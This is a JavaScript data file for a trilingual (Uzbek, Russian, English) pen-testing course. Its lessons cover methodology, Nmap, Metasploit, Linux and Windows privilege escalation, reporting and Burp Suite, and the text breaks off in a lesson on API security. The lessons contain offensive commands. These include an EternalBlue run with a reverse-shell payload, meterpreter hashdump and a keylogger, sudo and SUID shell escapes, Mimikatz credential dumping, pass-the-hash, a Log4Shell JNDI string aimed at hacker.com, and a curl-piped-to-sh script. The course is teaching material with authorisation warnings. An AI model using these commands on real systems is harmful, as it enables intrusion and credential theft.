// ============================================================
//  LEVEL 3 — ILG'OR | ПРОДВИНУТЫЙ | ADVANCED  (3-oy)
//  4 hafta × 3 dars = 12 dars
// ============================================================
module.exports = [
  // ─── 9-hafta: Pen-test Metodologiyasi ───
  {
    id:"c3w9", level:3, week:9, icon:"🕵️", color:"#ff4444",
    title:{ uz:"Pen-test Metodologiyasi", ru:"Методология пентеста", en:"Pen-test Methodology" },
    desc:{ uz:"Professional penetratsion test bosqichlari, qonuniy aspektlar va hisobot yozish", ru:"Этапы профессионального пентеста, правовые аспекты и написание отчётов", en:"Professional pen-test stages, legal aspects and report writing" },
    duration:{ uz:"3 × 40 daqiqa", ru:"3 × 40 минут", en:"3 × 40 minutes" },
    lessons:[
      {
        id:"c3w9l1",
        title:{ uz:"Pen-test bosqichlari va qonuniy asoslar", ru:"Этапы пентеста и правовые основы", en:"Pen-test stages and legal basis" },
        duration:"40 daq",
        content:{
          uz:`<h2>Pen-test Metodologiyasi</h2>
<p>Penetratsion test — bu <strong>ruxsat olingan hujum</strong>. Qonuniy va etik asoslar — birinchi o'rinda!</p>
<h3>⚖️ Qonuniy aspektlar — ENG MUHIM</h3>
<div class="info-box">
<p><strong>Rules of Engagement (ROE):</strong> Hujum doirasi, vaqti, metodlari hujjatlashtirilib kelishiladi.</p>
<p><strong>Scope (Doira):</strong> Qaysi IP/domenlar, qaysi tizimlarga ruxsat berilgan.</p>
<p><strong>Get Out of Jail Free Card:</strong> "Ushbu shaxs X kompaniyasi uchun ruxsatli pen-test o'tkazmoqda" hujjati.</p>
</div>
<pre><code># Pen-test turlari:
Black Box: Hujumchi nuqtai nazari, hech qanday ma'lumot yo'q
White Box: To'liq kirish — kod, arxitektura barchasi ko'rsatiladi
Grey Box: O'rtacha — ba'zi ma'lumotlar beriladi</code></pre>
<h3>📋 PTES Metodologiyasi (7 bosqich)</h3>
<pre><code>1. Recon (Razvedka)
   - Passiv: WHOIS, DNS, Google, LinkedIn, Shodan
   - Faol: Nmap, banner grabbing

2. Scanning & Enumeration
   - Port skan: nmap -sC -sV -A
   - Vulnerability skan: Nessus, OpenVAS
   - Web: Gobuster, Nikto, dirb

3. Exploitation
   - Metasploit, manual exploit
   - CVE-lardan foydalanish

4. Post-Exploitation
   - Privilege Escalation
   - Lateral Movement
   - Data Exfiltration

5. Persistence
   - Backdoor o'rnatish (ruxsat bilan!)
   - Cron job, registry key

6. Covering Tracks
   - Log tozalash (faqat test muhitida!)
   - Izlarni yo'qotish texnikasi o'rganish

7. Reporting
   - Executive Summary
   - Texnik tafsilotlar + dalillar
   - Tavsiyalar</code></pre>
<h3>🔍 OSINT — Ochiq ma'lumot razvedkasi</h3>
<pre><code># Google dorking:
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com ext:sql OR ext:env OR ext:config
intext:"password" site:target.com
"@target.com" -www   ← email manzillar

# Shodan (IoT va serverlar):
shodan search "target.com"
shodan host 192.168.1.1

# theHarvester (email, subdomen):
theHarvester -d target.com -b google,linkedin

# Maltego — grafik OSINT vositasi</code></pre>`,
          ru:`<h2>Методология пентеста</h2>
<h3>⚖️ Правовые аспекты — САМОЕ ВАЖНОЕ</h3>
<div class="info-box">
<p><strong>Rules of Engagement:</strong> Область, время, методы согласованы и задокументированы.</p>
<p><strong>Scope:</strong> Какие IP/домены, какие системы разрешены.</p>
<p><strong>Документ:</strong> "Данное лицо проводит авторизованный пентест X компании."</p>
</div>
<h3>📋 PTES Методология (7 этапов)</h3>
<pre><code>1. Разведка — WHOIS, DNS, Google, Shodan
2. Сканирование — nmap -sC -sV -A, Nessus
3. Эксплуатация — Metasploit, CVE
4. Пост-эксплуатация — PrivEsc, Lateral Movement
5. Закрепление — backdoor, cron job
6. Сокрытие следов — обучение техникам
7. Отчёт — Executive Summary + технические детали</code></pre>
<h3>🔍 OSINT</h3>
<pre><code># Google dorking:
site:target.com filetype:pdf
"@target.com" -www   ← email адреса

# Shodan:
shodan search "target.com"

# theHarvester:
theHarvester -d target.com -b google,linkedin</code></pre>`,
          en:`<h2>Pen-test Methodology</h2>
<h3>⚖️ Legal aspects — MOST IMPORTANT</h3>
<div class="info-box">
<p><strong>Rules of Engagement:</strong> Scope, timing, methods — all documented and agreed upon.</p>
<p><strong>Scope:</strong> Which IPs/domains, which systems are in scope.</p>
<p><strong>Get Out of Jail Card:</strong> "This person is conducting an authorised pen-test for X company."</p>
</div>
<h3>📋 PTES Methodology (7 stages)</h3>
<pre><code>1. Recon — WHOIS, DNS, Google, Shodan
2. Scanning — nmap -sC -sV -A, Nessus
3. Exploitation — Metasploit, CVE
4. Post-exploitation — PrivEsc, Lateral Movement
5. Persistence — backdoor, cron job
6. Covering Tracks — learning the techniques
7. Reporting — Executive Summary + technical details</code></pre>`
        },
        quiz:[
          { q:{uz:"'Black Box' pen-test nima?",ru:"Что такое 'Black Box' пентест?",en:"What is a 'Black Box' pen-test?"},
            options:{uz:["To'liq ma'lumot beriladi","Hech qanday ma'lumot berilmaydi — hujumchi nuqtai nazari","Yarim ma'lumot","Faqat web testlash"],ru:["Полная информация дана","Никакой информации — точка зрения хакера","Частичная информация","Только веб-тестирование"],en:["Full info given","No information — attacker's point of view","Partial information","Web only"]}, answer:1 }
        ]
      },
      {
        id:"c3w9l2",
        title:{ uz:"Nmap ilg'or skanerlash", ru:"Расширенное сканирование Nmap", en:"Advanced Nmap scanning" },
        duration:"40 daq",
        content:{
          uz:`<h2>Nmap — Ilg'or Skanerlash</h2>
<h3>🎯 NSE Skriptlar (Nmap Script Engine)</h3>
<pre><code># Skriptlarni ko'rish:
ls /usr/share/nmap/scripts/ | grep ftp
ls /usr/share/nmap/scripts/ | grep vuln

# Asosiy skriptlar:
nmap --script default target.com           # standart
nmap --script vuln target.com              # zaifliklar
nmap --script http-enum target.com         # web kataloglar
nmap --script smb-vuln-ms17-010 target.com # EternalBlue
nmap --script ftp-anon target.com          # anonim FTP

# Xizmat ma'lumotlari:
nmap --script banner target.com
nmap --script http-title target.com</code></pre>
<h3>🔒 Stealth Skanerlash</h3>
<pre><code># SYN skan (yarim ochiq, tezroq):
nmap -sS target.com

# Decoy skanerlash (IP ni yashirish):
nmap -D RND:10 target.com   # 10 ta soxta IP

# Fragment (paketlarni bo'lish):
nmap -f target.com

# Vaqtni o'zgartirish (sekin, ko'rinmas):
nmap -T0 target.com   # paranoyak (eng sekin)
nmap -T1 target.com   # yashirin
nmap -T5 target.com   # o'ta tez</code></pre>
<h3>🌐 Subdomen va Xizmat topish</h3>
<pre><code># Gobuster — web kataloglar va subdomains:
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# wfuzz — parametr fuzzing:
wfuzz -c -z file,wordlist.txt http://target.com/FUZZ

# ffuf (tez fuzzer):
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200</code></pre>
<h3>📊 Amaliy scan buyruqlari</h3>
<pre><code># To'liq reconnaissance:
nmap -sC -sV -O -A --script vuln -oA scan_results target.com

# Web server tekshirish:
nikto -h http://target.com

# SSL/TLS tekshirish:
sslscan target.com:443
testssl.sh target.com</code></pre>`,
          ru:`<h2>Расширенное сканирование Nmap</h2>
<h3>🎯 NSE Скрипты</h3>
<pre><code># Скрипты уязвимостей:
nmap --script vuln target.com
nmap --script smb-vuln-ms17-010 target.com  # EternalBlue
nmap --script http-enum target.com

# Скрытное сканирование:
nmap -sS target.com          # SYN scan
nmap -D RND:10 target.com    # Decoy
nmap -T0 target.com          # Паранойный режим</code></pre>
<h3>🌐 Поиск поддоменов</h3>
<pre><code>gobuster dns -d target.com -w subdomains.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200</code></pre>`,
          en:`<h2>Advanced Nmap scanning</h2>
<h3>🎯 NSE Scripts</h3>
<pre><code># Vulnerability scripts:
nmap --script vuln target.com
nmap --script smb-vuln-ms17-010 target.com  # EternalBlue
nmap --script http-enum target.com

# Stealth scanning:
nmap -sS target.com          # SYN scan
nmap -D RND:10 target.com    # Decoy IPs
nmap -T0 target.com          # Paranoid (slowest)</code></pre>
<h3>🌐 Subdomain discovery</h3>
<pre><code>gobuster dns -d target.com -w subdomains.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200</code></pre>`
        },
        quiz:[
          { q:{uz:"Nmap '-T0' opsiyasi nima uchun ishlatiladi?",ru:"Для чего используется опция Nmap '-T0'?",en:"What is Nmap '-T0' used for?"},
            options:{uz:["Eng tez skan","Eng sekin, eng yashirin skan","UDP skan","Versiya aniqlash"],ru:["Самое быстрое сканирование","Самое медленное, самое незаметное","UDP сканирование","Определение версии"],en:["Fastest scan","Slowest, stealthiest scan","UDP scan","Version detection"]}, answer:1 }
        ]
      },
      {
        id:"c3w9l3",
        title:{ uz:"Metasploit Framework asoslari", ru:"Основы Metasploit Framework", en:"Metasploit Framework basics" },
        duration:"40 daq",
        content:{
          uz:`<h2>Metasploit Framework</h2>
<p>Metasploit — dunyo bo'yicha eng ko'p ishlatiladigan pen-test framework. 2000+ exploit mavjud.</p>
<div class="info-box">
<p><strong>⚠️ Faqat ruxsat berilgan tizimlarida ishlating!</strong></p>
</div>
<h3>🏗️ Metasploit arxitekturasi</h3>
<div class="info-box">
<p><strong>Exploit:</strong> Zaiflikdan foydalanadigan kod</p>
<p><strong>Payload:</strong> Exploit muvaffaqiyatli bo'lgandan keyin bajariladigan kod (shell, meterpreter)</p>
<p><strong>Auxiliary:</strong> Skanerlash, sniffing, brute force modullari</p>
<p><strong>Post:</strong> Post-exploitation modullari</p>
<p><strong>Encoder:</strong> Payloadni antivirus dan yashirish</p>
</div>
<h3>🔧 Asosiy buyruqlar</h3>
<pre><code>msfconsole

# Qidirish:
search eternalblue
search type:exploit platform:windows
search cve:2021-44228   # Log4Shell

# Modulni tanlash:
use exploit/windows/smb/ms17_010_eternalblue

# Ma'lumotni ko'rish:
info
show options
show payloads

# Sozlash:
set RHOSTS 192.168.1.100    # maqsad
set LHOST 192.168.1.50      # sizning IP
set LPORT 4444              # tinglash porti
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Ishga tushirish:
check      # zaiflik bormi?
run        # yoki: exploit</code></pre>
<h3>🐚 Meterpreter Shell</h3>
<pre><code># Muvaffaqiyatli bo'lgach:
meterpreter > help

# Asosiy buyruqlar:
sysinfo         # tizim ma'lumoti
getuid          # joriy foydalanuvchi
getsystem       # root/SYSTEM ga o'tish
hashdump        # parol hashlari
upload file.txt # fayl yuborish
download file   # fayl olish
screenshot      # ekran surati
keyscan_start   # keylogger
shell           # oddiy shell</code></pre>
<h3>🎯 Vulnerability Scanner — OpenVAS</h3>
<pre><code># OpenVAS o'rnatish (Kali):
apt install openvas
gvm-setup
gvm-start

# Brauzerda: https://localhost:9392
# Login: admin

# Natija: CVSS ballar bilan zaifliklar ro'yxati
# Critical (9.0-10.0), High (7.0-8.9), Medium, Low</code></pre>`,
          ru:`<h2>Metasploit Framework</h2>
<div class="info-box">
<p><strong>⚠️ Только на авторизованных системах!</strong></p>
</div>
<h3>🔧 Основные команды</h3>
<pre><code>msfconsole

search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options

set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp

check
run</code></pre>
<h3>🐚 Meterpreter</h3>
<pre><code>sysinfo        # информация о системе
getuid         # текущий пользователь
getsystem      # повышение до SYSTEM
hashdump       # хеши паролей
screenshot     # снимок экрана</code></pre>`,
          en:`<h2>Metasploit Framework</h2>
<div class="info-box">
<p><strong>⚠️ Authorised systems only!</strong></p>
</div>
<h3>🔧 Core commands</h3>
<pre><code>msfconsole

search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options

set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp

check
run</code></pre>
<h3>🐚 Meterpreter</h3>
<pre><code>sysinfo        # system info
getuid         # current user
getsystem      # escalate to SYSTEM
hashdump       # password hashes
screenshot     # take screenshot</code></pre>`
        },
        quiz:[
          { q:{uz:"Metasploit da 'Payload' nima?",ru:"Что такое 'Payload' в Metasploit?",en:"What is a 'Payload' in Metasploit?"},
            options:{uz:["Zaiflikni topish kodi","Exploit muvaffaqiyatli bo'lgandan keyin bajariladigan kod","Port skaneri","Shifrlash vositasi"],ru:["Код для поиска уязвимостей","Код выполняемый после успешного эксплойта","Сканер портов","Инструмент шифрования"],en:["Code to find vulnerabilities","Code executed after successful exploit","Port scanner","Encryption tool"]}, answer:1 }
        ]
      }
    ]
  },

  // ─── 10-hafta: Privilege Escalation ───
  {
    id:"c3w10", level:3, week:10, icon:"⬆️", color:"#ff6600",
    title:{ uz:"Privilege Escalation va Post-Exploitation", ru:"Повышение привилегий и постэксплуатация", en:"Privilege Escalation and Post-Exploitation" },
    desc:{ uz:"Linux va Windows da huquqlarni kengaytirish, lateral movement va ma'lumot chiqarish", ru:"Повышение привилегий Linux/Windows, lateral movement и кража данных", en:"Linux/Windows privilege escalation, lateral movement and data exfiltration" },
    duration:{ uz:"3 × 40 daqiqa", ru:"3 × 40 минут", en:"3 × 40 minutes" },
    lessons:[
      {
        id:"c3w10l1",
        title:{ uz:"Linux Privilege Escalation", ru:"Повышение привилегий Linux", en:"Linux Privilege Escalation" },
        duration:"40 daq",
        content:{
          uz:`<h2>Linux Privilege Escalation</h2>
<p>Tizimga kirish muvaffaqiyatli bo'ldi, lekin oddiy foydalanuvchi sifatidasiz. Maqsad — root bo'lish!</p>
<h3>🔍 Birinchi qadam: Ma'lumot to'plash</h3>
<pre><code>whoami && id               # kim ekanman?
uname -a                   # OS va kernel versiya
cat /etc/os-release         # distrib
cat /etc/passwd            # foydalanuvchilar
cat /etc/shadow            # parol hashlari (root kerak)
sudo -l                    # sudo huquqlari
find / -perm -4000 2>/dev/null   # SUID fayllar
crontab -l                 # cron joblar
cat /etc/crontab           # barcha cron</code></pre>
<h3>🚀 PrivEsc yo'llari</h3>
<div class="info-box">
<p><strong>Sudo tekshirish:</strong></p>
<pre><code>sudo -l
# (ALL) NOPASSWD: /usr/bin/vim
# vim orqali root shell:
sudo vim -c ':!/bin/bash'</code></pre>
<p><strong>SUID fayllar:</strong></p>
<pre><code>find / -perm -u=s -type f 2>/dev/null
# /usr/bin/find topilsa:
/usr/bin/find . -exec /bin/bash -p \;</code></pre>
<p><strong>Zaif Kernel exploit:</strong></p>
<pre><code>uname -r   # 5.4.0 kernel
searchsploit linux kernel 5.4 local privilege</code></pre>
</div>
<h3>🔧 Avtomatik vositalar</h3>
<pre><code># LinPEAS — Linux PE skripti:
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum:
./LinEnum.sh -s -r report -e /tmp/

# Natijada:
# Sariq = muhim
# Qizil = kritik (exploit bo'lishi mumkin!)</code></pre>
<h3>📚 GTFOBins — SUID database</h3>
<p>gtfobins.github.io — SUID/sudo orqali shell olish yo'llari katalogi.</p>
<pre><code># Misol: python3 sudo bilan
sudo python3 -c 'import os; os.system("/bin/bash")'

# Misol: awk SUID
awk 'BEGIN {system("/bin/bash")}'</code></pre>`,
          ru:`<h2>Повышение привилегий Linux</h2>
<h3>🔍 Сбор информации</h3>
<pre><code>whoami && id && uname -a
sudo -l                    # права sudo
find / -perm -4000 2>/dev/null   # SUID файлы
crontab -l && cat /etc/crontab</code></pre>
<h3>🚀 Пути PrivEsc</h3>
<pre><code># Sudo:
sudo -l → (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# SUID файл find:
/usr/bin/find . -exec /bin/bash -p \;

# LinPEAS автоматическая проверка:
curl -L .../linpeas.sh | sh</code></pre>`,
          en:`<h2>Linux Privilege Escalation</h2>
<h3>🔍 Information gathering</h3>
<pre><code>whoami && id && uname -a
sudo -l                    # sudo permissions
find / -perm -4000 2>/dev/null   # SUID files
crontab -l && cat /etc/crontab</code></pre>
<h3>🚀 PrivEsc paths</h3>
<pre><code># Sudo:
sudo -l → (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# SUID find binary:
/usr/bin/find . -exec /bin/bash -p \;

# LinPEAS auto-check:
curl -L .../linpeas.sh | sh</code></pre>`
        },
        quiz:[
          { q:{uz:"SUID bit nima uchun xavfli bo'lishi mumkin?",ru:"Почему SUID бит может быть опасен?",en:"Why can SUID bit be dangerous?"},
            options:{uz:["Faylni o'chiradi","Fayl egasi huquqida bajariladi — root faylda root huquq berishi mumkin","Tarmoqni sekinlashtiradi","Cookie o'chiradi"],ru:["Удаляет файл","Выполняется с правами владельца — root файл даёт права root","Замедляет сеть","Удаляет cookie"],en:["Deletes file","Runs as file owner — root-owned file can give root rights","Slows network","Deletes cookies"]}, answer:1 }
        ]
      },
      {
        id:"c3w10l2",
        title:{ uz:"Windows Privilege Escalation", ru:"Повышение привилегий Windows", en:"Windows Privilege Escalation" },
        duration:"40 daq",
        content:{
          uz:`<h2>Windows Privilege Escalation</h2>
<h3>🔍 Windows da ma'lumot to'plash</h3>
<pre><code># Tizim ma'lumoti:
systeminfo
whoami /priv
net users
net localgroup administrators

# Zaif xizmatlar:
wmic service list brief
sc qc servicename

# Rejestr parollari:
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Zaif papka ruxsatlari:
icacls "C:\Program Files\*" /findsid *S-1-5-32-545* /t</code></pre>
<h3>🚀 Windows PrivEsc yo'llari</h3>
<div class="info-box">
<p><strong>Unquoted Service Path:</strong></p>
<pre><code>C:\Program Files\My App\service.exe
→ C:\Program.exe tekshiriladi! (agar yozsak ishga tushadi)</code></pre>
<p><strong>Weak Service Permissions:</strong></p>
<pre><code>accesschk.exe -ucqv servicename
sc config servicename binPath= "cmd.exe /c whoami > C:\out.txt"</code></pre>
<p><strong>AlwaysInstallElevated:</strong></p>
<pre><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 1 bo'lsa → MSI paket bilan SYSTEM!</code></pre>
</div>
<h3>🔧 Avtomatik vositalar</h3>
<pre><code># WinPEAS:
winpeas.exe

# PowerSploit:
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt (C#):
Seatbelt.exe all</code></pre>
<h3>🔑 Mimikatz — Hisob ma'lumotlari</h3>
<pre><code># LSASS xotirasidan parollar (SYSTEM kerak):
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
# Natijada: plaintext parollar yoki hashlar!

# Pass-the-Hash:
sekurlsa::pth /user:admin /domain:. /ntlm:hashvalue /run:cmd.exe</code></pre>`,
          ru:`<h2>Повышение привилегий Windows</h2>
<h3>🔍 Сбор информации</h3>
<pre><code>systeminfo
whoami /priv
net users && net localgroup administrators
reg query HKLM /f password /t REG_SZ /s</code></pre>
<h3>🚀 Пути PrivEsc</h3>
<pre><code># Unquoted Service Path:
C:\Program Files\My App\service.exe
→ C:\Program.exe проверяется!

# WinPEAS автоматически:
winpeas.exe

# Mimikatz (SYSTEM требуется):
privilege::debug
sekurlsa::logonpasswords</code></pre>`,
          en:`<h2>Windows Privilege Escalation</h2>
<h3>🔍 Information gathering</h3>
<pre><code>systeminfo
whoami /priv
net users && net localgroup administrators
reg query HKLM /f password /t REG_SZ /s</code></pre>
<h3>🚀 PrivEsc paths</h3>
<pre><code># Unquoted Service Path:
C:\Program Files\My App\service.exe
→ C:\Program.exe gets checked!

# WinPEAS auto-check:
winpeas.exe

# Mimikatz (requires SYSTEM):
privilege::debug
sekurlsa::logonpasswords</code></pre>`
        },
        quiz:[
          { q:{uz:"'Unquoted Service Path' zaifligida nima sodir bo'ladi?",ru:"Что происходит при уязвимости 'Unquoted Service Path'?",en:"What happens in an 'Unquoted Service Path' vulnerability?"},
            options:{uz:["Tarmoq uziladi","Windows bo'shliqli yo'lni noto'g'ri talqin qilib, soxta dasturni ishlatishi mumkin","Fayl o'chiriladi","Parol o'zgaradi"],ru:["Сеть отключается","Windows неправильно интерпретирует путь с пробелом, может выполнить фейковую программу","Файл удаляется","Пароль меняется"],en:["Network disconnects","Windows misinterprets the unquoted path, may run a fake program","File deleted","Password changes"]}, answer:1 }
        ]
      },
      {
        id:"c3w10l3",
        title:{ uz:"Hisobot yozish va CVE tizimi", ru:"Написание отчётов и система CVE", en:"Report writing and the CVE system" },
        duration:"35 daq",
        content:{
          uz:`<h2>Pen-test Hisoboti va CVE Tizimi</h2>
<h3>📋 Professional hisobot tuzilmasi</h3>
<div class="info-box">
<p><strong>1. Executive Summary (Rahbariyat uchun):</strong> 1-2 sahifa, texnik tafsilot yo'q. Xavf darajasi, umumiy holat, tezkor harakatlar.</p>
<p><strong>2. Texnik hisobot:</strong> Har bir zaiflik uchun: CVSS ball, tavsif, dalil (screenshot), ekspluatatsiya yo'li, tavsiya.</p>
<p><strong>3. Ilovalar:</strong> Xom skan natijalari, to'liq log.</p>
</div>
<h3>📊 CVSS — Zaiflik og'irlik bali</h3>
<pre><code>CVSS 3.1 bali:
9.0-10.0 = CRITICAL  🔴
7.0-8.9  = HIGH      🟠
4.0-6.9  = MEDIUM    🟡
0.1-3.9  = LOW       🟢
0.0      = NONE

CVSS kalkulyator: nvd.nist.gov/vuln-metrics/cvss</code></pre>
<h3>🏷️ CVE tizimi</h3>
<pre><code>CVE = Common Vulnerabilities and Exposures

Format: CVE-[yil]-[raqam]
Misol:
CVE-2021-44228  → Log4Shell (Apache Log4j)
CVE-2017-0144   → EternalBlue (MS17-010)
CVE-2014-0160   → Heartbleed (OpenSSL)

# CVE ni qidirish:
cve.mitre.org
nvd.nist.gov
exploit-db.com (PoC kodlar bilan)</code></pre>
<h3>🔧 Zaiflik tarihiy misollar</h3>
<div class="info-box">
<p><strong>EternalBlue (2017):</strong> NSA yaratgan, WannaCry ransomware ishlatdi. Butun dunyo bo'yicha $4 mlrd zarar.</p>
<p><strong>Log4Shell (2021):</strong> Java Log4j kutubxonasi. Juda oson ishlatish — URL ichida: <code>\${jndi:ldap://hacker.com}</code></p>
<p><strong>Heartbleed (2014):</strong> OpenSSL — server xotirasini o'qish. Millionlab parollar o'g'irlandi.</p>
</div>
<h3>🛡️ Patch Management</h3>
<pre><code># CVE chiqqanda nima qilish:
1. CVE ni o'qing — og'irlik bali, ta'sir qilingan versiyalar
2. Patch bormi? → darhol o'rnating
3. Patch yo'q (0-day)? → vaqtincha yechiml:
   - Firewall qoidasi (port yobing)
   - WAF qoidasi
   - Xizmatni o'chiring (agar mumkin)
4. Monitoring kuchaytiring — hujum bo'ldimi?</code></pre>`,
          ru:`<h2>Отчёт пентеста и система CVE</h2>
<h3>📋 Структура профессионального отчёта</h3>
<div class="info-box">
<p><strong>1. Executive Summary:</strong> 1-2 страницы, без техники. Уровень риска, общее состояние.</p>
<p><strong>2. Технический отчёт:</strong> Каждая уязвимость: CVSS балл, описание, доказательство (скриншот), путь эксплуатации, рекомендации.</p>
</div>
<h3>📊 CVSS баллы</h3>
<pre><code>9.0-10.0 = CRITICAL  🔴
7.0-8.9  = HIGH      🟠
4.0-6.9  = MEDIUM    🟡
0.1-3.9  = LOW       🟢</code></pre>
<h3>🏷️ CVE система</h3>
<pre><code>CVE-2021-44228  → Log4Shell
CVE-2017-0144   → EternalBlue (WannaCry)
CVE-2014-0160   → Heartbleed</code></pre>`,
          en:`<h2>Pen-test Report and CVE System</h2>
<h3>📋 Professional report structure</h3>
<div class="info-box">
<p><strong>1. Executive Summary:</strong> 1-2 pages, no technical details. Risk level, overall status.</p>
<p><strong>2. Technical report:</strong> Per vulnerability: CVSS score, description, evidence (screenshot), exploitation path, recommendations.</p>
</div>
<h3>📊 CVSS Scores</h3>
<pre><code>9.0-10.0 = CRITICAL  🔴
7.0-8.9  = HIGH      🟠
4.0-6.9  = MEDIUM    🟡
0.1-3.9  = LOW       🟢</code></pre>
<h3>🏷️ CVE System</h3>
<pre><code>CVE-2021-44228  → Log4Shell
CVE-2017-0144   → EternalBlue (WannaCry)
CVE-2014-0160   → Heartbleed</code></pre>`
        },
        quiz:[
          { q:{uz:"CVSS 9.5 bali qaysi darajaga kiradi?",ru:"В какую категорию входит балл CVSS 9.5?",en:"What severity is a CVSS score of 9.5?"},
            options:{uz:["Low","Medium","High","Critical"],ru:["Low","Medium","High","Critical"],en:["Low","Medium","High","Critical"]}, answer:3 }
        ]
      }
    ]
  },

  // ─── 11-hafta: Web App Pentesting ───
  {
    id:"c3w11", level:3, week:11, icon:"🕷️", color:"#cc00ff",
    title:{ uz:"Web Ilova Pentesting", ru:"Пентест веб-приложений", en:"Web Application Pentesting" },
    desc:{ uz:"Burp Suite bilan professional web test, API xavfsizligi va bug bounty asoslari", ru:"Профессиональный веб-тест с Burp Suite, безопасность API и основы bug bounty", en:"Professional web testing with Burp Suite, API security and bug bounty basics" },
    duration:{ uz:"3 × 40 daqiqa", ru:"3 × 40 минут", en:"3 × 40 minutes" },
    lessons:[
      {
        id:"c3w11l1",
        title:{ uz:"Burp Suite ilg'or ishlatish", ru:"Продвинутое использование Burp Suite", en:"Advanced Burp Suite usage" },
        duration:"40 daq",
        content:{
          uz:`<h2>Burp Suite — Ilg'or Ishlatish</h2>
<h3>🎯 Burp Intruder — Avtomatik hujum</h3>
<pre><code># Brute Force hujumi:
1. Login so'rovini ushlang
2. "Send to Intruder" (Ctrl+I)
3. Maqsad parametrlarni belgilang: §password§
4. Payload List: wordlist.txt
5. Attack Type: Sniper
6. Start Attack!

# Hisobot:
- Eng qisqa javob → login muvaffaqiyatli!
- Status 302 → redirect = muvaffaqiyat

# Cluster Bomb: 2 ta parametr — username + password
§username§ va §password§
username_list.txt + password_list.txt</code></pre>
<h3>🔍 Burp Scanner</h3>
<pre><code># Pro versiyada (Community da cheklangan):
Target → right click → "Scan"

# Topishi mumkin:
- SQL Injection
- XSS
- XXE
- SSRF
- Insecure deserialization
- Path traversal
- Command injection</code></pre>
<h3>🔌 Burp Extensions</h3>
<pre><code># Extender tab → BApp Store:
AuthMatrix      → ruxsat tekshirish
CSRF Scanner    → CSRF topish
J2EEScan        → Java zaifliklar
Retire.js       → Eski JavaScript kutubxona
Active Scan++   → Kengaytirilgan skan

# Python bilan o'z extensionni yozish:</code></pre>
<h3>📝 Amaliy web pentesting workflow</h3>
<pre><code>1. Spider/Crawl: barcha URL topish
   Target → right click → "Spider this host"

2. Directory/File brute:
   gobuster dir -u http://target.com -w common.txt

3. Parameter fuzzing:
   ffuf -u http://target.com/page?id=FUZZ -w numbers.txt

4. Har bir input:
   - SQLi test: ' " ; ) OR 1=1 --
   - XSS test: <script>alert(1)</script>
   - IDOR: raqamni o'zgartirish

5. Auth bypass:
   - Parolsiz kirish
   - JWT manipulyatsiya
   - Cookie manipulation</code></pre>`,
          ru:`<h2>Продвинутое использование Burp Suite</h2>
<h3>🎯 Burp Intruder</h3>
<pre><code># Brute Force:
1. Перехватите запрос входа
2. Send to Intruder (Ctrl+I)
3. Отметьте: §password§
4. Payload: wordlist.txt
5. Start Attack!

# Кластерная бомба (2 параметра):
§username§ и §password§</code></pre>
<h3>📝 Workflow веб-пентеста</h3>
<pre><code>1. Spider: все URL
2. Directory brute: gobuster
3. Fuzzing параметров: ffuf
4. Каждый input: SQLi, XSS, IDOR
5. Auth bypass: JWT, Cookie</code></pre>`,
          en:`<h2>Advanced Burp Suite usage</h2>
<h3>🎯 Burp Intruder</h3>
<pre><code># Brute Force:
1. Intercept login request
2. Send to Intruder (Ctrl+I)
3. Mark: §password§
4. Payload: wordlist.txt
5. Start Attack!

# Cluster Bomb (2 params):
§username§ and §password§</code></pre>
<h3>📝 Web pentesting workflow</h3>
<pre><code>1. Spider: all URLs
2. Directory brute: gobuster
3. Parameter fuzzing: ffuf
4. Each input: SQLi, XSS, IDOR
5. Auth bypass: JWT, Cookie</code></pre>`
        },
        quiz:[
          { q:{uz:"Burp Intruder 'Cluster Bomb' rejimi nima uchun?",ru:"Для чего режим 'Cluster Bomb' в Burp Intruder?",en:"What is Burp Intruder 'Cluster Bomb' mode for?"},
            options:{uz:["Bitta parametrni sinash","Ikki va undan ko'p parametrlarni bir vaqtda brute force qilish","Sahifani tezlashtirish","Cookie o'chirish"],ru:["Тестирование одного параметра","Перебор двух и более параметров одновременно","Ускорение страницы","Удаление cookie"],en:["Testing one parameter","Brute-forcing two or more parameters simultaneously","Speeding up page","Deleting cookies"]}, answer:1 }
        ]
      },
      {
        id:"c3w11l2",
        title:{ uz:"API Xavfsizligi", ru:"Безопасность API", en:"API Security" },
        duration:"40 daq",
        content:{
          uz:`<h2>API Xavfsizligi</h2>
<p>Zamonaviy ilovalar API orqali ishlaydi. API zaifliklar — bugungi eng katta muammo!</p>
<h3>🔌 REST API asoslari</h3>
<pre><code># Oddiy API so'rovlar:
GET    /api/users/123      → 123-foydalanuvchi ma'lumoti
POST   /api/users          → yangi foydalanuvchi yaratish
PUT    /api/users/123      → 123-ni yangilash
DELETE /api/users/123      → 123-ni o'chirish

# Authentication:
Authorization: Bearer eyJhbGci...   # JWT
Authorization: Basic dXNlcjpwYXNz  # Basic Auth (Base64)
X-API-Key: secret123                # API key</code></pre>
<h3>⚠️ API zaifliklar (OWASP API Top 10)</h3>
<div class="info-box">
<p><strong>API1 — Broken Object Level Auth (BOLA/IDOR):</strong><br>
GET /api/orders/1001 → GET /api/orders/1002 (boshqa foydalanuvchi!)</p>
<p><strong>API2 — Broken Auth:</strong> Zaif token, JWT manipulation</p>
<p><strong>API3 — Broken Object Property Level Auth:</strong> Keraksiz maydonlar ko'rsatiladi</p>
<p><strong>API5 — Broken Function Level Auth:</strong> Admin funksiyalariga kirish</p>
